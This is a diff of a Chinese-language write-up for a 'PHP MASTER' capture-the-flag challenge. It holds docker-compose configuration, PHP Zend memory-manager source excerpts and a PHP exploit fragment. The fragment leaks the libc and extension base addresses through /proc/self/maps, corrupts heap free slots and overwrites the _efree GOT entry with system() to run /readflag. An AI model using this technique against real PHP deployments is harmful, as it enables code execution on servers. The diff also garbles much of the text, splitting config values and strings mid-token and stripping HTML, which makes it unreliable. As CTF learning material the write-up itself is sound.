@@ -15,11 +15,13 @@ services:
 #服务名
   php-master:
 #镜像
-    image: php-master:attachment-v1
+    image: php-master:
+attachment-v1
 #映射的端口，
     ports:
       - "80:80"
-      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口
+      - "28888:
+9191"# 将主机的28888端口映射到容器中的9191端口
 #文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
     volumes:
       - ./data:/var/www/html/exp
@@ -55,62 +57,26 @@ $msg_class = 'error';
 <head>
     <meta charset="UTF-8">
     <title>PHP MASTER</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 20px;
-        }
-        .upload-box {
-            border: 2px dashed #ccc;
-            padding: 30px;
-            text-align: center;
-        }
-        .btn {
-            background: #007bff;
-            color: white;
-            padding: 10px20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background: #0056b3;
-        }
-        .message {
-            padding: 15px;
-            margin: 20px0;
-            border-radius: 4px;
-        }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-    </style>
+    
 </head>
-<body>
+
     <h2>PHP MASTER</h2>
 
     <?php if (isset($message)): ?>
-        <div class="message <?php echo$msg_class; ?>">
+        ">
             <?php echo$message; ?>
-        </div>
+        
     <?php endif; ?>
 
     <form action="" method="post" enctype="multipart/form-data" class="upload-box">
-        <p>请选择要上传的文件：</p>
-        <input type="file" name="file" required>
-        <br><br>
-        <button type="submit" class="btn">上传文件</button>
+        请选择要上传的文件：
+        
+        
+
+
+        上传文件
     </form>
-</body>
+
 </html>
 
 ZEND_API int zend_parse_parameters(int num_args, const char *type_spec, ...);
@@ -396,7 +362,8 @@ do {
     heap->free_slot[bin_num] = p;
 }
 
-./gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php
+./gdbserver-7.10.1-x64 :
+9191 php -S 0:80 exp.php
 
 $map_file = "/proc/self/map";
 $system_off = 0x44AF0;
@@ -427,9 +394,12 @@ ob_end_flush();
 get_so_base($buffer);
 $efree_got += $vuln_so_base;
 
-echo"libc base address: " . dechex($libc_base) . "n<br>";
-echo"vuln.so base address: " . dechex($vuln_so_base) . "n<br>";
-echo"_efree.got: " . dechex($efree_got) . "n<br>";
+echo"libc base address: " . dechex($libc_base) . "n
+";
+echo"vuln.so base address: " . dechex($vuln_so_base) . "n
+";
+echo"_efree.got: " . dechex($efree_got) . "n
+";
 
 construct(0x10);
 allocate(0,0x30);
@@ -454,12 +424,15 @@ services:
 #服务名
   php-master:
 #镜像
-    image: php-master:attachment-v1
+    image: php-master:
+attachment-v1
 #映射的端口，
     ports:
       - "80:80"# 用于映射上传服务
-      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器
-      - "1111:8080"# 用于触发exp.php 调试
+      - "28888:
+9191"# 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器
+      - "1111:
+8080"# 用于触发exp.php 调试
 #文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
     volumes:
       - ./data:/var/www/html/exp
@@ -496,17 +469,7 @@ https://bbs.kanxue.com/user-home-1010243.htm
 ```
 docker load -i php-master.tar
 docker run -it your_image_id  /bin/bash
-```
-
-
-
-```
 find . | grep "extensions"
-```
-
-
-
-```
 # 版本号
 version: '3'
 #启动的服务
@@ -514,19 +477,16 @@ services:
 #服务名
   php-master:
 #镜像
-    image: php-master:attachment-v1
+    image: php-master:
+attachment-v1
 #映射的端口，
     ports:
       - "80:80"
-      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口
+      - "28888:
+9191"# 将主机的28888端口映射到容器中的9191端口
 #文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
     volumes:
       - ./data:/var/www/html/exp
-```
-
-
-
-```
 <?php
 @error_reporting(E_ALL);
 
@@ -558,96 +518,50 @@ $msg_class = 'error';
 <head>
     <meta charset="UTF-8">
     <title>PHP MASTER</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 20px;
-        }
-        .upload-box {
-            border: 2px dashed #ccc;
-            padding: 30px;
-            text-align: center;
-        }
-        .btn {
-            background: #007bff;
-            color: white;
-            padding: 10px20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background: #0056b3;
-        }
-        .message {
-            padding: 15px;
-            margin: 20px0;
-            border-radius: 4px;
-        }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-    </style>
+    
 </head>
-<body>
+
     <h2>PHP MASTER</h2>
 
     <?php if (isset($message)): ?>
-        <div class="message <?php echo$msg_class; ?>">
+        ">
             <?php echo$message; ?>
-        </div>
+        
     <?php endif; ?>
 
     <form action="" method="post" enctype="multipart/form-data" class="upload-box">
-        <p>请选择要上传的文件：</p>
-        <input type="file" name="file" required>
-        <br><br>
-        <button type="submit" class="btn">上传文件</button>
+        请选择要上传的文件：
+        
+        
+
+
+        上传文件
     </form>
-</body>
+
 </html>
-```
-
-
-
-```
 ZEND_API int zend_parse_parameters(int num_args, const char *type_spec, ...);
-```
-
-
-
-```
 struct_zend_mm_heap {
-#if ZEND_MM_CUSTOM
+    #if ZEND_MM_CUSTOM
     int                use_custom_heap;
-#endif
-#if ZEND_MM_STORAGE
+    #endif
+    #if ZEND_MM_STORAGE
     zend_mm_storage   *storage;
-#endif
-#if ZEND_MM_STAT
+    #endif
+    #if ZEND_MM_STAT
     size_t             size;                    /* current memory usage */
     size_t             peak;                    /* peak memory usage */
-#endif
+    #endif
     zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */
-#if ZEND_MM_STAT || ZEND_MM_LIMIT
+    #if ZEND_MM_STAT || ZEND_MM_LIMIT
     size_t             real_size;               /* current size of allocated pages */
-#endif
-#if ZEND_MM_STAT
+    #endif
+    #if ZEND_MM_STAT
     size_t             real_peak;               /* peak size of allocated pages */
-#endif
-#if ZEND_MM_LIMIT
+    #endif
+    #if ZEND_MM_LIMIT
     size_t             limit;                   /* memory limit */
     int                overflow;                /* memory overflow flag */
-#endif
+    #endif
 
     zend_mm_huge_list *huge_list;               /* list of huge allocated blocks */
 
@@ -659,7 +573,7 @@ struct_zend_mm_heap {
     double             avg_chunks_count; /* average number of chunks allocated per request */
     int                last_chunks_delete_boundary; /* number of chunks after last deletion */
     int                last_chunks_delete_count;    /* number of deletion over the last boundary */
-#if ZEND_MM_CUSTOM
+    #if ZEND_MM_CUSTOM
 union {
 struct {
             void      *(*_malloc)(size_t);
@@ -673,13 +587,8 @@ void       (*_free)(void*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
         } debug;
     } custom_heap;
     HashTable *tracked_allocs;
-#endif
+    #endif
 };
-```
-
-
-
-```
 struct_zend_mm_chunk {
     zend_mm_heap      *heap;
     zend_mm_chunk     *next;
@@ -692,27 +601,17 @@ struct_zend_mm_chunk {
     zend_mm_page_map   free_map;                /* 512 bits or 64 bytes */
     zend_mm_page_info  map[ZEND_MM_PAGES];      /* 2 KB = 512 * 4 */
 };
-```
-
-
-
-```
 ZEND_API void* ZEND_FASTCALL _emalloc(size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
 {
-#if ZEND_MM_CUSTOM 
+    #if ZEND_MM_CUSTOM 
 //如果采用自定义
 if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
 return _malloc_custom(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
     }
-#endif
+    #endif
 //默认的php zend引擎管理器
 returnzend_mm_alloc_heap(AG(mm_heap), size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
 }
-```
-
-
-
-```
 /*
  * bin - is one or few continuous pages (up to 8) used for allocation of
  * a particular "small size".
@@ -724,15 +623,10 @@ struct_zend_mm_bin {
 struct_zend_mm_free_slot {
     zend_mm_free_slot *next_free_slot;
 };
-```
-
-
-
-```
 static zend_always_inline void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
 {
     void *ptr;
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
     size_t real_size = size;
     zend_mm_debug_info *dbg;
 
@@ -743,44 +637,39 @@ if (UNEXPECTED(size < real_size)) {
 zend_error_noreturn(E_ERROR, "Possible integer overflow in memory allocation (%zu + %zu)", ZEND_MM_ALIGNED_SIZE(real_size), ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
 returnNULL;
     }
-#endif
+    #endif
 if (EXPECTED(size <= ZEND_MM_MAX_SMALL_SIZE)) {
         ptr = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size) ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
         dbg = zend_mm_get_debug_info(heap, ptr);
         dbg->size = real_size;
         dbg->filename = __zend_filename;
         dbg->orig_filename = __zend_orig_filename;
         dbg->lineno = __zend_lineno;
         dbg->orig_lineno = __zend_orig_lineno;
-#endif
+    #endif
 return ptr;
     } elseif (EXPECTED(size <= ZEND_MM_MAX_LARGE_SIZE)) {
         ptr = zend_mm_alloc_large(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
         dbg = zend_mm_get_debug_info(heap, ptr);
         dbg->size = real_size;
         dbg->filename = __zend_filename;
         dbg->orig_filename = __zend_orig_filename;
         dbg->lineno = __zend_lineno;
         dbg->orig_lineno = __zend_orig_lineno;
-#endif
+    #endif
 return ptr;
     } else {
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
         size = real_size;
-#endif
+    #endif
 returnzend_mm_alloc_huge(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
     }
 }
-```
-
-
-
-```
 static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
 {
-#if ZEND_MM_STAT
+    #if ZEND_MM_STAT
 //获取页之类的操作？给整个heap管理结构体更新信息
 do {
         size_t size = heap->size + bin_data_size[bin_num];
@@ -788,7 +677,7 @@ do {
         heap->size = size;
         heap->peak = peak;
     } while (0);
-#endif
+    #endif
 // 如果free_list里有东西，直接取出来，更新free_list
 if (EXPECTED(heap->free_slot[bin_num] != NULL)) {
         zend_mm_free_slot *p = heap->free_slot[bin_num];
@@ -799,11 +688,6 @@ return p;
 returnzend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
     }
 }
-```
-
-
-
-```
 static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
 {
     zend_mm_chunk *chunk;
@@ -811,12 +695,12 @@ static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint
     zend_mm_bin *bin;
     zend_mm_free_slot *p, *end;
 
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
     bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num], bin_data_size[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
-#else
+    #else
 //申请页内存给到bin
     bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
-#endif
+    #endif
 if (UNEXPECTED(bin == NULL)) {
 /* insufficient memory */
 returnNULL;
@@ -840,77 +724,58 @@ do {
     heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
 do {
         p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
 do {
             zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
             dbg->size = 0;
         } while (0);
-#endif
+    #endif
         p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
     } while (p != end);
 
 /* terminate list using NULL */
     p->next_free_slot = NULL;
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
 do {
             zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
             dbg->size = 0;
         } while (0);
-#endif
+    #endif
 
 /* return first element */
 return bin;
 }
-```
-
-
-
-```
 ZEND_API void ZEND_FASTCALL _efree(void *ptr ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
 {
-#if ZEND_MM_CUSTOM
+    #if ZEND_MM_CUSTOM
     if (UNEXPECTED(AG(mm_heap)->use_custom_heap)) {
 _efree_custom(ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
         return;
     }
-#endif
+    #endif
 zend_mm_free_heap(AG(mm_heap), ptr ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
 }
-```
-
-
-
-```
 static zend_always_inline voidzend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
 {
     zend_mm_free_slot *p;
 
-#if ZEND_MM_STAT
+    #if ZEND_MM_STAT
     heap->size -= bin_data_size[bin_num];
-#endif
+    #endif
 
-#if ZEND_DEBUG
+    #if ZEND_DEBUG
 do {
         zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
         dbg->size = 0;
     } while (0);
-#endif
+    #endif
 
     p = (zend_mm_free_slot*)ptr;
     p->next_free_slot = heap->free_slot[bin_num];
     heap->free_slot[bin_num] = p;
 }
-```
-
-
-
-```
-./gdbserver-7.10.1-x64 :9191 php -S 0:80 exp.php
-```
-
-
-
-```
+./gdbserver-7.10.1-x64 :
+9191 php -S 0:80 exp.php
 $map_file = "/proc/self/map";
 $system_off = 0x44AF0;
 $libc_base = 0;
@@ -940,14 +805,12 @@ ob_end_flush();
 get_so_base($buffer);
 $efree_got += $vuln_so_base;
 
-echo"libc base address: " . dechex($libc_base) . "n<br>";
-echo"vuln.so base address: " . dechex($vuln_so_base) . "n<br>";
-echo"_efree.got: " . dechex($efree_got) . "n<br>";
-```
-
-
-
-```
+echo"libc base address: " . dechex($libc_base) . "n
+";
+echo"vuln.so base address: " . dechex($vuln_so_base) . "n
+";
+echo"_efree.got: " . dechex($efree_got) . "n
+";
 construct(0x10);
 allocate(0,0x30);
 allocate(1,0x30);
@@ -963,11 +826,6 @@ overwrite(0,"/readflag>/var/www/html/flagx00");
 
 overwrite(1,p64($libc_base + $system_off));
 clear();
-```
-
-
-
-```
 # 版本号
 version: '3'
 #启动的服务
@@ -975,12 +833,15 @@ services:
 #服务名
   php-master:
 #镜像
-    image: php-master:attachment-v1
+    image: php-master:
+attachment-v1
 #映射的端口，
     ports:
       - "80:80"# 用于映射上传服务
-      - "28888:9191"# 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器
-      - "1111:8080"# 用于触发exp.php 调试
+      - "28888:
+9191"# 将主机的28888端口映射到容器中的9191端口 用于gdbserver本地连容器
+      - "1111:
+8080"# 用于触发exp.php 调试
 #文件夹映射  将当前主机目录下的data文件夹作为共享文件夹，映射到容器中的/var/www/html/exp文件夹中
     volumes:
       - ./data:/var/www/html/exp
